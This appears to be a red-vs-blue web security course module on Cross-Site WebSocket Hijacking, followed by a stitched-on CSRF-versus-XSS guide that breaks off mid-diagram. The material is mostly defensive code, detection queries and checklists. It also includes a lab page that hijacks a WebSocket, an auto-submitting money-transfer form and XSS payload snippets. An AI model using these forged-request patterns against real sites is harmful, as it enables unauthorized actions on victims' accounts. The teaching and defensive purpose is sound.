
# CSRF Deep Dive: Cross-Site WebSocket Hijacking

## Course Context

This module is for a red-vs-blue team web security course. It explains how classic CSRF concepts extend into WebSocket-based applications.

The vulnerable pattern is:

```text
User authenticates to target app
        |
        v
Browser stores session cookie
        |
        v
User visits attacker-controlled page
        |
        v
Attacker page opens WebSocket to target
        |
        v
Browser may attach target cookies during WebSocket handshake
        |
        v
Target accepts socket because it trusts cookies only
        |
        v
Attacker page sends victim-authenticated WebSocket messages
````

This is commonly called:

```text
Cross-Site WebSocket Hijacking
CSWSH
Cross-Origin WebSocket Hijacking
WebSocket CSRF
```

OWASP’s WebSocket guidance recommends validating `Origin`, using `SameSite=Lax` or `SameSite=Strict` cookies where possible, and revalidating long-running sessions because WebSocket connections can outlive normal session assumptions. ([OWASP Cheat Sheet Series][2])

---

# 1. Classic CSRF vs WebSocket CSRF

## Classic CSRF

Classic CSRF usually abuses browser-submitted HTTP requests:

```text
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
```

The browser automatically attaches cookies for the target site, so the server may treat the request as legitimate.

## WebSocket CSRF

WebSocket CSRF abuses the WebSocket handshake:

```javascript
const ws = new WebSocket("wss://target.example/ws");
```

If the victim has a valid cookie for `target.example`, the browser may include it during the WebSocket upgrade request depending on cookie attributes, browser behavior, and site relationship.

The vulnerable server pattern is:

```text
Handshake arrives
        |
        v
Cookie is present
        |
        v
Server authenticates user from cookie
        |
        v
Server does not validate Origin
        |
        v
Server does not require CSRF token / nonce / subprotocol token
        |
        v
Socket opens
```

---

# 2. Side-by-Side Comparison

| Area                 | Classic CSRF                                | WebSocket CSRF / CSWSH                                             |
| -------------------- | ------------------------------------------- | ------------------------------------------------------------------ |
| Transport            | HTTP request                                | WebSocket upgrade + persistent socket                              |
| Typical method       | POST form, image, script, fetch, navigation | `new WebSocket("wss://target/ws")`                                 |
| Auth weakness        | Cookie-only session auth                    | Cookie-only WebSocket handshake auth                               |
| Main missing control | CSRF token / Origin validation              | Origin validation / handshake token                                |
| Impact window        | Usually one request                         | Persistent bidirectional channel                                   |
| Detection            | Suspicious state-changing HTTP requests     | Suspicious WebSocket handshakes/messages                           |
| Key server signal    | Missing or cross-site `Origin` / `Referer`  | Cross-site `Origin` on WebSocket upgrade                           |
| Mitigation           | CSRF token, SameSite, Origin checks         | Origin allowlist, handshake nonce, SameSite, message authorization |

OWASP’s CSRF cheat sheet stresses that CSRF protections should be chosen based on authentication method and application design, and that XSS can defeat CSRF mitigations. ([OWASP Cheat Sheet Series][3])

---

# 3. Red Team Mental Model

The red-team question is not:

> Can I open a WebSocket?

The better question is:

> Can I open a victim-authenticated WebSocket from a different origin and send state-changing messages?

A vulnerable application usually has this shape:

```text
Target app:
  - Uses cookie-based auth
  - WebSocket endpoint accepts cross-origin handshakes
  - Does not validate Origin
  - Does not require a per-session CSRF token
  - Does not require an unpredictable WebSocket subprotocol value
  - Authorizes once at connection time
  - Does weak or no authorization per message
```

---

# 4. Lecture-Safe Red-Team Demo Code

This demo is safe for a lab because the messages are harmless. It demonstrates the mechanics without destructive payloads.

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>CSWSH Lab Demo</title>
</head>
<body>
  <h1>Cross-Site WebSocket Hijacking Lab Demo</h1>
  <p>This page attempts to open a WebSocket to a lab target.</p>
  <pre id="log"></pre>

  <script>
    class WebSocketCSRFLabDemo {
      constructor(targetWSUrl) {
        this.targetWSUrl = targetWSUrl;
        this.websocket = null;
        this.logEl = document.getElementById("log");
      }

      log(message, data = null) {
        const line = data
          ? `${new Date().toISOString()} ${message} ${JSON.stringify(data)}`
          : `${new Date().toISOString()} ${message}`;

        console.log(line);
        this.logEl.textContent += line + "\n";
      }

      establishConnection() {
        return new Promise((resolve, reject) => {
          try {
            this.log("Attempting WebSocket connection", {
              target: this.targetWSUrl
            });

            this.websocket = new WebSocket(this.targetWSUrl);

            this.websocket.onopen = () => {
              this.log("WebSocket connection opened");
              resolve(true);
            };

            this.websocket.onmessage = (event) => {
              this.log("Received message from lab server", {
                data: event.data
              });
            };

            this.websocket.onerror = () => {
              this.log("WebSocket connection error");
              reject(new Error("WebSocket connection failed"));
            };

            this.websocket.onclose = (event) => {
              this.log("WebSocket connection closed", {
                code: event.code,
                reason: event.reason
              });
            };
          } catch (error) {
            reject(error);
          }
        });
      }

      sendLabMessages() {
        const labMessages = [
          {
            type: "lab_probe",
            action: "whoami",
            note: "Harmless identity check for CSWSH training"
          },
          {
            type: "lab_probe",
            action: "read_preferences",
            note: "Harmless read-style probe for training"
          },
          {
            type: "lab_state_change",
            action: "set_theme",
            value: "training-mode",
            note: "Harmless state-change simulation"
          }
        ];

        labMessages.forEach((message, index) => {
          setTimeout(() => {
            if (this.websocket && this.websocket.readyState === WebSocket.OPEN) {
              this.websocket.send(JSON.stringify(message));
              this.log("Sent lab message", message);
            }
          }, index * 1000);
        });
      }

      async run() {
        try {
          await this.establishConnection();

          setTimeout(() => {
            this.sendLabMessages();
          }, 500);

          return true;
        } catch (error) {
          this.log("Lab demo failed", {
            error: error.message
          });
          return false;
        }
      }
    }

    const demo = new WebSocketCSRFLabDemo("wss://lab-target.example/ws");
    demo.run();
  </script>
</body>
</html>
```

## Red-Team Teaching Notes

This page does **not** bypass authentication.

It tests whether the browser and target server together allow this chain:

```text
Attacker origin
    |
    | JavaScript creates WebSocket
    v
Target WebSocket endpoint
    |
    | Browser may attach target cookies
    v
Server accepts cookie-authenticated handshake
    |
    | Server fails to reject bad Origin
    v
Attacker page controls victim-authenticated socket
```

---

# 5. Vulnerable Server Pattern

A vulnerable server often does something like this:

```javascript
// Vulnerable teaching example.
// Do not use this pattern in production.

server.on("upgrade", (request, socket, head) => {
  const session = authenticateFromCookie(request.headers.cookie);

  if (!session) {
    socket.destroy();
    return;
  }

  // Missing:
  // - Origin validation
  // - CSRF token validation
  // - per-message authorization
  // - session freshness checks

  websocketServer.handleUpgrade(request, socket, head, (ws) => {
    ws.user = session.user;
    websocketServer.emit("connection", ws, request);
  });
});
```

The core issue:

```text
Cookie present == trusted user
```

That is not enough for WebSocket handshakes.

---

# 6. Secure Server Pattern: Origin Allowlist

A stronger server verifies `Origin` before accepting the socket.

```javascript
import http from "node:http";
import { WebSocketServer } from "ws";

const allowedOrigins = new Set([
  "https://app.example.com"
]);

function isAllowedOrigin(origin) {
  if (!origin) {
    return false;
  }

  try {
    const parsed = new URL(origin);
    return allowedOrigins.has(parsed.origin);
  } catch {
    return false;
  }
}

function rejectUpgrade(socket, statusCode = 403, reason = "Forbidden") {
  socket.write(
    `HTTP/1.1 ${statusCode} ${reason}\r\n` +
    "Connection: close\r\n" +
    "\r\n"
  );
  socket.destroy();
}

const server = http.createServer();
const wss = new WebSocketServer({ noServer: true });

server.on("upgrade", (request, socket, head) => {
  const origin = request.headers.origin;

  if (!isAllowedOrigin(origin)) {
    rejectUpgrade(socket, 403, "Forbidden");
    return;
  }

  const session = authenticateFromCookie(request.headers.cookie);

  if (!session) {
    rejectUpgrade(socket, 401, "Unauthorized");
    return;
  }

  websocketServer.handleUpgrade(request, socket, head, (ws) => {
    ws.user = session.user;
    websocketServer.emit("connection", ws, request);
  });
});
```

## Blue-Team Notes

Log rejected origins:

```text
timestamp
remote_ip
origin
host
path
user_agent
reason
```

Alert on:

```text
Origin missing
Origin not in allowlist
Valid session cookie + bad Origin
High-volume failed WebSocket upgrades
Unexpected external origins
```

---

# 7. Secure Server Pattern: Handshake CSRF Token

Origin validation is necessary, but for high-risk apps, add an unpredictable token.

## Token flow

```text
User loads app from trusted origin
        |
        v
Server renders page or API returns short-lived WS token
        |
        v
Frontend opens WebSocket with token
        |
        v
Server validates:
  - session cookie
  - Origin
  - token belongs to session
  - token is fresh
  - token is single-use or narrow-use
```

Example:

```javascript
const wsToken = await fetch("/api/ws-token", {
  method: "POST",
  credentials: "same-origin",
  headers: {
    "Content-Type": "application/json"
  }
}).then((r) => r.json());

const ws = new WebSocket(`wss://app.example.com/ws?token=${encodeURIComponent(wsToken.token)}`);
```

Server-side checks:

```javascript
server.on("upgrade", async (request, socket, head) => {
  const origin = request.headers.origin;

  if (!isAllowedOrigin(origin)) {
    rejectUpgrade(socket, 403, "Forbidden");
    return;
  }

  const session = authenticateFromCookie(request.headers.cookie);

  if (!session) {
    rejectUpgrade(socket, 401, "Unauthorized");
    return;
  }

  const url = new URL(request.url, "https://app.example.com");
  const token = url.searchParams.get("token");

  if (!token || !(await validateWebSocketToken(session.user.id, token))) {
    rejectUpgrade(socket, 403, "Invalid WebSocket token");
    return;
  }

  wss.handleUpgrade(request, socket, head, (ws) => {
    ws.user = session.user;
    wss.emit("connection", ws, request);
  });
});
```

## Important Token Warning

Avoid logging tokens in URLs.

Better options include:

```text
Sec-WebSocket-Protocol
short-lived one-time ticket
server-side nonce bound to session
explicit Authorization header when non-browser clients are used
```

For browser JavaScript, custom headers are not available in the native WebSocket constructor, so teams often use a short-lived query token or `Sec-WebSocket-Protocol`. Treat either as sensitive.

---

# 8. Secure Server Pattern: Subprotocol Token

The browser WebSocket API lets the client pass subprotocol values:

```javascript
const ws = new WebSocket("wss://app.example.com/ws", [
  "app-v1",
  `csrf.${wsToken}`
]);
```

Server validates the offered protocols:

```javascript
function extractWsCsrfProtocol(header) {
  if (!header) {
    return null;
  }

  const protocols = header
    .split(",")
    .map((value) => value.trim());

  const csrfProtocol = protocols.find((value) => value.startsWith("csrf."));

  if (!csrfProtocol) {
    return null;
  }

  return csrfProtocol.slice("csrf.".length);
}
```

Defensive requirements:

```text
Token must be unpredictable
Token must be bound to authenticated session
Token must expire quickly
Token should be single-use or narrow-use
Server must reject missing/invalid token
Server must still validate Origin
```

---

# 9. Message-Level Authorization

Even with a secure handshake, do not trust every message.

Bad pattern:

```javascript
ws.on("message", (raw) => {
  const message = JSON.parse(raw);

  if (message.type === "admin_action") {
    performAdminAction(message);
  }
});
```

Better pattern:

```javascript
ws.on("message", async (raw) => {
  const message = parseJsonSafely(raw);

  if (!message) {
    ws.close(1003, "Invalid message");
    return;
  }

  if (!isKnownMessageType(message.type)) {
    ws.close(1008, "Policy violation");
    return;
  }

  const allowed = await authorizeMessage({
    user: ws.user,
    messageType: message.type,
    resourceId: message.resourceId,
    action: message.action
  });

  if (!allowed) {
    logSecurityEvent("ws_message_denied", {
      userId: ws.user.id,
      messageType: message.type,
      action: message.action
    });

    ws.close(1008, "Not authorized");
    return;
  }

  await handleMessage(ws.user, message);
});
```

Blue-team lesson:

```text
Handshake authentication answers:
  "Who opened the socket?"

Message authorization answers:
  "May this user perform this action on this resource right now?"
```

---

# 10. SameSite Cookies

`SameSite` helps, but should be treated as defense-in-depth rather than the only control. OWASP recommends `SameSite=Lax` or `SameSite=Strict` to reduce cross-site cookie transmission for WebSocket attacks. ([OWASP Cheat Sheet Series][2])

Recommended cookie shape:

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/
```

For highly sensitive apps:

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict; Path=/
```

Tradeoff:

```text
SameSite=Strict:
  stronger CSRF protection
  may break some cross-site login / SSO / deep-link flows

SameSite=Lax:
  more compatible
  less restrictive than Strict

SameSite=None:
  requires Secure
  higher CSRF exposure
  use only when cross-site cookie behavior is explicitly required
```

PortSwigger notes that SameSite is a browser mechanism controlling when cookies are included in cross-site requests, but it is partial protection and can be bypassed in some scenarios depending on site relationship and application behavior. ([PortSwigger][4])

---

# 11. Fetch Metadata Headers

For normal HTTP CSRF, Fetch Metadata headers can help reject suspicious cross-site requests:

```text
Sec-Fetch-Site
Sec-Fetch-Mode
Sec-Fetch-Dest
```

Example HTTP middleware:

```javascript
function rejectCrossSiteStateChanges(req, res, next) {
  const site = req.headers["sec-fetch-site"];

  if (
    req.method !== "GET" &&
    site &&
    site !== "same-origin" &&
    site !== "same-site"
  ) {
    res.status(403).send("Cross-site request rejected");
    return;
  }

  next();
}
```

However, do not assume Fetch Metadata fully solves WebSocket CSRF across every stack and browser path. For WebSockets, prioritize:

```text
Origin allowlist
unpredictable handshake token
session validation
message authorization
SameSite cookies
```

---

# 12. ASCII Attack Flow

```text
+-------------------+       visits        +----------------------+
| Victim Browser    | ------------------> | Attacker Web Page    |
| logged into app   |                     | evil.example         |
+-------------------+                     +----------+-----------+
                                                    |
                                                    |
                                                    | new WebSocket()
                                                    v
+-------------------+      Upgrade request  +----------------------+
| Browser Cookie    | --------------------> | Target WebSocket API |
| Jar               |   Cookie: session=... | wss://app/ws         |
+-------------------+                       +----------+-----------+
                                                       |
                                                       | vulnerable if:
                                                       | - no Origin check
                                                       | - no WS CSRF token
                                                       | - cookie-only auth
                                                       v
                                            +----------------------+
                                            | Victim-authenticated |
                                            | socket opens         |
                                            +----------+-----------+
                                                       |
                                                       | attacker sends
                                                       | lab messages
                                                       v
                                            +----------------------+
                                            | Server performs      |
                                            | actions as victim    |
                                            +----------------------+
```

---

# 13. ASCII Defense Flow

```text
WebSocket Upgrade Request
        |
        v
+-------------------------+
| Check TLS / wss         |
+-----------+-------------+
            |
            v
+-------------------------+
| Validate Origin         |
| against allowlist       |
+-----------+-------------+
            |
            v
+-------------------------+
| Validate session cookie |
+-----------+-------------+
            |
            v
+-------------------------+
| Validate WS CSRF token  |
| or subprotocol nonce    |
+-----------+-------------+
            |
            v
+-------------------------+
| Bind socket to user     |
| and session metadata    |
+-----------+-------------+
            |
            v
+-------------------------+
| Authorize each message  |
+-----------+-------------+
            |
            v
+-------------------------+
| Log, rate limit, expire |
+-------------------------+
```

---

# 14. Red-Team Test Plan

## Test 1: Can a cross-origin page open the socket?

From attacker-controlled origin:

```javascript
const ws = new WebSocket("wss://target.example/ws");

ws.onopen = () => console.log("opened");
ws.onerror = () => console.log("error");
ws.onclose = (event) => console.log("closed", event.code, event.reason);
```

Expected secure result:

```text
Connection rejected
HTTP 403 during upgrade
or socket closes immediately with policy violation
```

## Test 2: Does server validate Origin?

Inspect upgrade request:

```text
Origin: https://attacker.example
Host: target.example
Cookie: session=...
Upgrade: websocket
Connection: Upgrade
```

Secure result:

```text
Origin https://attacker.example rejected
```

## Test 3: Does server require a WS token?

Attempt connection without token:

```javascript
new WebSocket("wss://target.example/ws");
```

Secure result:

```text
Rejected: missing token
```

Attempt connection with random token:

```javascript
new WebSocket("wss://target.example/ws?token=random");
```

Secure result:

```text
Rejected: invalid token
```

## Test 4: Does message authorization exist?

After a valid socket opens, test whether low-privilege users can send high-privilege message types.

Use harmless lab messages:

```json
{
  "type": "lab_admin_probe",
  "action": "should_be_denied"
}
```

Secure result:

```text
Message denied
Event logged
Socket optionally closed with policy violation
```

---

# 15. Blue-Team Detection Ideas

## Web Server / Reverse Proxy Logs

Look for WebSocket upgrades with suspicious origins:

```text
method=GET
status=101 or 403
upgrade=websocket
origin != expected app origin
cookie_present=true
```

Useful fields:

```text
timestamp
source_ip
user_id
session_id_hash
host
path
origin
user_agent
status
close_code
reason
```

## Application Logs

Log these events:

```text
ws_upgrade_rejected_bad_origin
ws_upgrade_rejected_missing_token
ws_upgrade_rejected_invalid_token
ws_message_denied
ws_message_schema_invalid
ws_session_expired
ws_rate_limited
```

## Example Detection Logic

```text
IF websocket_upgrade_attempt
AND origin NOT IN approved_origins
AND cookie_present == true
THEN alert "Possible CSWSH attempt"
```

```text
IF user has many WebSocket 403s
AND origins are diverse
THEN alert "Possible CSWSH probing"
```

```text
IF WebSocket opened from unusual ASN / user-agent / origin pattern
AND sensitive message type follows
THEN alert "Possible WebSocket abuse"
```

---

# 16. NGINX Logging Example

```nginx
map $http_upgrade $is_websocket {
    default 0;
    websocket 1;
}

log_format ws_security
  'time="$time_iso8601" '
  'remote_addr="$remote_addr" '
  'host="$host" '
  'request="$request" '
  'status="$status" '
  'is_websocket="$is_websocket" '
  'origin="$http_origin" '
  'user_agent="$http_user_agent" '
  'cookie_present="$http_cookie"';

access_log /var/log/nginx/ws_security.log ws_security;
```

Note: avoid logging raw cookies in production. Prefer a boolean or hashed session identifier.

---

# 17. Splunk Hunting Examples

## Bad Origin WebSocket Upgrades

```spl
index=web sourcetype=nginx
is_websocket=1
origin!="https://app.example.com"
| stats count values(origin) values(user_agent) by src_ip host request status
| sort -count
```

## Cookie Present with Rejected WebSocket Origin

```spl
index=app sourcetype=websocket
event=ws_upgrade_rejected_bad_origin
cookie_present=true
| stats count values(origin) values(user_id) by src_ip
| sort -count
```

## Sensitive Message Denials

```spl
index=app sourcetype=websocket
event=ws_message_denied
| stats count values(message_type) values(action) by user_id src_ip origin
| sort -count
```

---

# 18. Developer Fix Checklist

## Required

```text
[ ] Use wss:// only
[ ] Validate Origin on every browser WebSocket upgrade
[ ] Use explicit allowlist, not regex vibes
[ ] Authenticate the session during upgrade
[ ] Require unpredictable WS token or nonce for sensitive sockets
[ ] Bind token to session/user
[ ] Expire token quickly
[ ] Authorize every message
[ ] Validate message schema
[ ] Rate limit connection attempts and message volume
[ ] Revalidate session periodically
[ ] Close socket when session expires or user logs out
[ ] Log rejected upgrades and denied messages
```

## Cookie Hardening

```text
[ ] HttpOnly
[ ] Secure
[ ] SameSite=Lax or Strict
[ ] Narrow Path where possible
[ ] Reasonable session lifetime
```

## Do Not Rely On

```text
[ ] CORS alone
[ ] Cookie auth alone
[ ] Hidden frontend routes
[ ] Obscure WebSocket URLs
[ ] Client-side authorization checks
[ ] SameSite alone
```

---

# 19. Red-vs-Blue Exercise

## Lab Setup

Blue team receives a WebSocket endpoint:

```text
wss://lab.example/ws
```

The endpoint has three message types:

```text
whoami
set_theme
admin_probe
```

## Round 1: Vulnerable

Server behavior:

```text
Accepts cookie-authenticated WebSocket
Does not validate Origin
Does not require token
Does not authorize message type
```

Red team goal:

```text
Open socket from attacker origin
Send harmless lab messages
Prove victim-authenticated action path
```

Blue team goal:

```text
Identify cross-origin WebSocket handshakes
Add logging
Write detection
Patch Origin validation
```

## Round 2: Partially Fixed

Server behavior:

```text
Validates Origin
Still lacks message authorization
```

Red team goal:

```text
Test same-site bypass assumptions
Test low-privilege user sending high-privilege message type
```

Blue team goal:

```text
Add message authorization
Add schema validation
Add security logs
```

## Round 3: Hardened

Server behavior:

```text
Origin allowlist
Short-lived WS token
Session-bound socket
Per-message authorization
SameSite cookies
Session revalidation
```

Red team goal:

```text
Confirm exploit path is closed
Document residual risk
```

Blue team goal:

```text
Show before/after logs
Show blocked attack evidence
Show secure design diagram
```

---

# 20. Executive Summary

Cross-Site WebSocket Hijacking is CSRF adapted to persistent WebSocket channels. The vulnerable condition is usually cookie-only authentication during the WebSocket handshake without strict Origin validation or an unpredictable handshake token.

The highest-risk apps are real-time systems where WebSocket messages trigger meaningful actions:

```text
admin consoles
collaboration apps
chat systems
trading dashboards
CI/CD control planes
remote management tools
cloud consoles
support tooling
IoT/device management
```

The durable fix is layered:

```text
Origin allowlist
SameSite cookies
short-lived WebSocket token
session revalidation
per-message authorization
schema validation
logging and detection
```

CORS is not the fix. Cookie auth alone is not enough. Treat the WebSocket handshake like a sensitive state-changing request, then treat every message like an API call requiring authorization.

````

````

[1]: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking?utm_source=chatgpt.com "Cross-site WebSocket hijacking | Web Security Academy"
[2]: https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html?utm_source=chatgpt.com "WebSocket Security - OWASP Cheat Sheet Series"
[3]: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com "Cross-Site Request Forgery Prevention Cheat Sheet"
[4]: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions?utm_source=chatgpt.com "Bypassing SameSite cookie restrictions"

##
##


# CSRF vs XSS: Enhanced Technical Guide with Visual Diagrams

## Attack Flow Diagrams

### CSRF Attack Flow
```
┌─────────────┐    1. Visit malicious site    ┌─────────────┐
│   Victim    │ ──────────────────────────────▶│  Attacker   │
│   Browser   │                                │    Site     │
└─────────────┘                                └─────────────┘
       │                                              │
       │ 2. Malicious site serves                     │
       │    forged request                            │
       ▼                                              │
┌─────────────┐                                       │
│   Victim    │                                       │
│   Browser   │                                       │
│ ┌─────────┐ │ 3. Browser auto-includes               │
│ │ Cookies │ │    auth cookies                       │
│ │ Session │ │                                       │
│ └─────────┘ │                                       │
└─────────────┘                                       │
       │                                              │
       │ 4. Authenticated request                     │
       │    (victim unaware)                          │
       ▼                                              │
┌─────────────┐                                       │
│   Target    │ 5. Executes action                    │
│   Website   │    (transfer money, etc.)             │
│             │                                       │
└─────────────┘                                       │
       │                                              │
       │ 6. Success response                          │
       └──────────────────────────────────────────────┘
```

### XSS Attack Flow
```
┌─────────────┐    1. Inject malicious script    ┌─────────────┐
│  Attacker   │ ─────────────────────────────────▶│   Target    │
│             │                                   │   Website   │
└─────────────┘                                   └─────────────┘
                                                         │
                                                         │ 2. Store/Reflect
                                                         │    malicious script
                                                         ▼
┌─────────────┐    3. Visit infected page        ┌─────────────┐
│   Victim    │ ──────────────────────────────────│   Target    │
│   Browser   │                                   │   Website   │
└─────────────┘                                   └─────────────┘
       ▲                                                 │
       │                                                 │ 4. Serve page with
       │                                                 │    malicious script
       │                                                 ▼
       │                                          ┌─────────────┐
       │ 6. Script executes in                    │   Victim    │
       │    target's context                      │   Browser   │
       │                                          │ ┌─────────┐ │
       │                                          │ │ Cookies │ │
       │                                          │ │ Session │ │
       │                                          │ └─────────┘ │
       │                                          └─────────────┘
       │                                                 │
       │                                                 │ 5. Malicious script
       │                                                 │    accesses data
       │                                                 ▼
       │                                          ┌─────────────┐
       └──────────────────────────────────────────│  Attacker   │
                 7. Steal data/credentials        │   Server    │
                                                  └─────────────┘
```

## Comprehensive Comparison Table

| Category | CSRF | XSS |
|----------|------|-----|
| **Attack Vector** | Forged cross-site requests | Malicious script injection |
| **Execution Context** | Victim's browser → Target site | Target site → Victim's browser |
| **Trust Exploitation** | Site trusts authenticated user | User trusts legitimate site |
| **User Awareness** | Often completely unaware | May notice unusual behavior |
| **Persistence** | Per-request basis | Can be persistent (Stored XSS) |
| **Authentication Required** | Yes (victim must be logged in) | No (but more powerful if authenticated) |
| **Same-Origin Limitation** | Bypasses (cross-site nature) | Executes within origin |
| **Primary Impact** | Unauthorized actions | Data theft, session hijacking |
| **Detection Difficulty** | Moderate (network analysis) | High (content analysis required) |

## Attack Scenarios Matrix

### CSRF Scenarios
```
┌─────────────────────┬─────────────────────┬─────────────────────┬─────────────────────┐
│   Attack Type       │   Delivery Method   │   Target Action     │   Stealth Level     │
├─────────────────────┼─────────────────────┼─────────────────────┼─────────────────────┤
│ Form Auto-Submit    │ Malicious Website   │ State Change        │ High                │
│ Image Tag Exploit   │ Email/Website       │ GET-based Action    │ Very High           │
│ AJAX Request        │ Malicious Website   │ API Calls           │ Medium              │
│ File Upload         │ Malicious Website   │ File System Access  │ Medium              │
│ WebSocket Hijack    │ Malicious Website   │ Real-time Actions   │ High                │
└─────────────────────┴─────────────────────┴─────────────────────┴─────────────────────┘
```

### XSS Scenarios
```
┌─────────────────────┬─────────────────────┬─────────────────────┬─────────────────────┐
│   XSS Type          │   Injection Point   │   Payload Delivery  │   Persistence       │
├─────────────────────┼─────────────────────┼─────────────────────┼─────────────────────┤
│ Reflected           │ URL Parameters      │ Malicious Link      │ Temporary           │
│ Stored              │ Database            │ User Input Forms    │ Permanent           │
│ DOM-based           │ Client-side JS      │ URL Fragments       │ Temporary           │
│ Mutation-based      │ DOM Manipulation    │ Dynamic Content     │ Temporary           │
│ Server-side         │ Template Engine     │ Server Processing   │ Permanent           │
└─────────────────────┴─────────────────────┴─────────────────────┴─────────────────────┘
```

## Technical Implementation Comparison

### CSRF Attack Implementations

#### Simple Form-Based CSRF
```ascii
Attacker Site Structure:
┌─────────────────────────────────────────┐
│ <html>                                  │
│   <body onload="document.forms[0].      │
│                 submit()">              │
│     <form action="https://bank.com/     │
│           transfer" method="POST">      │
│       <input name="to" value="evil">   │
│       <input name="amount" value="1000">│
│     </form>                             │
│   </body>                              │
│ </html>                                 │
└─────────────────────────────────────────┘
```

#### JSON API CSRF
```ascii
Modern API Attack:
┌─────────────────────────────────────────┐
│ fetch('https://api.target.com/users',   │
│   {                                     │
│     method: 'DELETE',                   │
│     credentials: 'include',             │
│     headers: {                          │
│       'Content-Type': 'application/json'│
│     },                                  │
│     body: JSON.stringify({id: 'victim'})│
│   }                                     │
│ );                                      │
└─────────────────────────────────────────┘
```

### XSS Attack Implementations

#### Reflected XSS Flow
```ascii
Request Flow:
┌─────────────┐    GET /search?q=<script>  ┌─────────────┐
│   Victim    │ ─────────alert('XSS')──────▶│   Target    │
│   Browser   │                             │   Server    │
└─────────────┘                             └─────────────┘
       ▲                                           │
       │                                           │
       │ HTTP/1.1 200 OK                          │
       │ <h1>Results for: <script>                │
       │ alert('XSS')</script></h1>               │
       └───────────────────────────────────────────┘
```

#### Stored XSS Database Flow
```ascii
Database Injection:
┌─────────────┐    POST /comment           ┌─────────────┐
│  Attacker   │ ──────────────────────────▶│   Web       │
│             │  payload: <script>evil()   │   Server    │
└─────────────┘                             └─────────────┘
                                                   │
                                                   ▼
                                            ┌─────────────┐
                                            │  Database   │
                                            │ ┌─────────┐ │
                                            │ │ comments│ │
                                            │ │ <script>│ │
                                            │ │ evil()  │ │
                                            │ └─────────┘ │
                                            └─────────────┘
                                                   │
┌─────────────┐    GET /comments           ┌─────────────┐
│   Victim    │ ◄──────────────────────────│   Web       │
│   Browser   │  <script>evil()</script>   │   Server    │
└─────────────┘                             └─────────────┘
```

## Defense Mechanisms Comparison

### CSRF Defense Architecture
```ascii
Defense Layers:
┌─────────────────────────────────────────────────────────────┐
│                    CSRF Defense Stack                       │
├─────────────────────────────────────────────────────────────┤
│ Layer 1: SameSite Cookies                                   │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Set-Cookie: session=abc123; SameSite=Strict; Secure    │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: CSRF Tokens                                        │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ <input type="hidden" name="csrf" value="random_token">  │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Origin/Referer Validation                          │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ if (origin !== 'https://trusted-site.com') reject()    │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: Custom Headers                                     │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ X-Requested-With: XMLHttpRequest                        │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### XSS Defense Architecture
```ascii
Defense Layers:
┌─────────────────────────────────────────────────────────────┐
│                     XSS Defense Stack                       │
├─────────────────────────────────────────────────────────────┤
│ Layer 1: Input Validation & Sanitization                    │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Input → Validate → Sanitize → Encode → Store/Display   │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Content Security Policy (CSP)                      │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Content-Security-Policy: script-src 'self' 'nonce-xyz' │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Output Encoding                                    │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ <script> → &lt;script&gt;                               │ │
│ └─────────────────────────────────────────────────────────┘ │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: HTTPOnly Cookies                                   │
│ ┌─────────────────────────────────────────────────────────┐ │
│ │ Set-Cookie: session=abc123; HttpOnly; Secure           │ │
│ └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

## Combined Attack Scenario

### XSS-Enhanced CSRF Attack Flow
```ascii
Advanced Combined Attack:
                    ┌─────────────┐
                    │  Attacker   │
                    │   Server    │
                    └─────────────┘
                           │
                           │ 1. Inject XSS payload
                           ▼
    ┌─────────────┐ ──────────────────── ┌─────────────┐
    │   Victim    │ 2. Visit target site │   Target    │
    │   Browser   │ ◄─────────────────── │   Website   │
    └─────────────┘                      └─────────────┘
           │                                     │
           │ 3. XSS payload executes            │
           ▼                                     │
    ┌─────────────┐                             │
    │   Malicious │ 4. Extract CSRF token       │
    │   Script    │ ◄───────────────────────────┘
    │   Execution │
    └─────────────┘
           │
           │ 5. Forge authenticated request
           │    with valid CSRF token
           ▼
    ┌─────────────┐
    │   Target    │ 6. Execute privileged action
    │   Website   │    (appears legitimate)
    │   API       │
    └─────────────┘
```

## 2025 Threat Landscape

### Emerging Attack Vectors
```ascii
Modern Web Attack Surface:
┌─────────────────────────────────────────────────────────────┐
│                    Browser Environment                       │
├─────────────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────┐ │
│ │   Main      │ │   Service   │ │   Web       │ │  WASM   │ │
│ │   Thread    │ │   Worker    │ │  Worker     │ │ Module  │ │
│ │   ┌─────┐   │ │   ┌─────┐   │ │   ┌─────┐   │ │ ┌─────┐ │ │
│ │   │ XSS │   │ │   │ XSS │   │ │   │ XSS │   │ │ │ XSS │ │ │
│ │   └─────┘   │ │   └─────┘   │ │   └─────┘   │ │ └─────┘ │ │
│ └─────────────┘ └─────────────┘ └─────────────┘ └─────────┘ │
├─────────────────────────────────────────────────────────────┤
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────┐ │
│ │   Browser   │ │   PWA       │ │   Extension │ │  iframe │ │
│ │   Extension │ │   Context   │ │   Content   │ │ Context │ │
